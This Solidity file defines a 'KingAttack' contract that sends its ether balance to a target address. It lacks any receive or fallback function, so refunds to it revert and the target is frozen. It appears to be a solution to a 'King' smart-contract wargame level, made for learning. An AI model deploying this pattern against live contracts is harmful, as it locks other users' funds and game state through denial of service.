// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    address kingAddress;

    constructor(address _kingAddress) payable {
        kingAddress = _kingAddress;
    }

    function attack() public {
        (bool sent, ) = kingAddress.call{value: address(this).balance}("");
        require(sent);
    }
}
